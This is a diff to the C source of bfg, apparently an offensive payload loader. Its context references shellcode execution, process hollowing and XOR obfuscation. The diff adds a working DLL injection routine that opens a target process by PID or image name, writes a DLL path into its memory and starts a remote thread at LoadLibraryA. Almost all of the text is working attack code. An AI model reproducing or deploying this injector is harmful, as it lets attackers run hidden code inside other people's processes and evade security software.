@@ -1,5 +1,5 @@
 /*
-Author: Daniel Sauder
+Author: Daniel Sauder, Florian Saager
 License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
 Web: https://github.com/govolution/bfg
 */
@@ -34,6 +34,9 @@ void exec_shellcode(unsigned char *shellcode);
 void exec_shellcode64(unsigned char *shellcode);
 #ifdef INJECT_SHELLCODE
 DWORD inject_sc_process(unsigned char *shellcode, DWORD pid);
+#endif
+#ifdef INJECT_DLL
+DWORD InjectDLL(PCHAR pDll, DWORD dwProcessID); 
 #endif
 #ifdef IMAGE
 DWORD get_pid_by_name(char *imgname);
@@ -94,17 +97,11 @@ int main (int argc, char **argv)
 		buffer = FVALUE;
 	#endif
 
-	//TODO: clean that
 	#ifndef LOADEXEC_DLL
 	#ifndef PROCESS_HOLLOWING
-		#ifndef ENCRYPT
-			#ifndef ASCIIMSF 
-				#ifdef PRINT_DEBUG
-				printf("exec shellcode without decode_shellcode\n");
-				#endif
-				shellcode = buf;	//buf is from defs.h if shellcode is included
-			#endif
-		#endif
+	#ifndef INJECT_DLL
+		shellcode = buf;	//buf is from defs.h if shellcode is included
+	#endif
 	#endif
 	#endif
 	
@@ -141,6 +138,24 @@ int main (int argc, char **argv)
 	#endif
 	#endif
 	}
+
+	#ifdef INJECT_DLL
+	#ifdef PID
+		CHAR pDllPath[5000] = "";
+		GetFullPathNameA(argv[1], 5000, pDllPath, NULL);
+		return InjectDLL(pDllPath, atoi(argv[2]));
+	#endif
+	#ifdef IMAGE
+		int tmp=get_pid_by_name(IMAGE);
+		#ifdef PRINT_DEBUG
+			printf("Imagename to search: %s\n", IMAGE); 
+			printf("PID %d\n", tmp);
+		#endif
+		CHAR pDllPath[5000] = "";
+		GetFullPathNameA(argv[1], 5000, pDllPath, NULL);
+		return InjectDLL(pDllPath, tmp);
+	#endif
+	#endif
 	
 	#ifdef PROCESS_HOLLOWING
 		#ifdef XOR_OBFUSCATION
@@ -351,6 +366,44 @@ DWORD get_pid_by_name(char *imgname)
 	}
 
 	return -2;
+}
+#endif
+
+#ifdef INJECT_DLL
+#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
+DWORD InjectDLL(PCHAR pDll, DWORD dwProcessID) 
+{
+	HANDLE hProc;
+	HANDLE hRemoteThread;
+	LPVOID pRemoteBuffer;
+	LPVOID pLoadLibAddr;
+
+	if(!dwProcessID) {
+		return 1;
+	}
+	hProc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, dwProcessID);
+	if(!hProc) {
+		return 2;
+	}
+
+	pLoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+	if (!pLoadLibAddr) {
+		return 3;
+	}
+	pRemoteBuffer = VirtualAllocEx(hProc, NULL, strlen(pDll), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+	if (!pRemoteBuffer) {
+		return 4;
+	}
+
+	if (!WriteProcessMemory(hProc, pRemoteBuffer, pDll, strlen(pDll), NULL)) {
+		return 5;
+	}
+	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibAddr, pRemoteBuffer, 0, NULL);
+	if (!hRemoteThread) {
+		return 6;
+	}
+	CloseHandle(hProc);
+	return 0;
 }
 #endif
 
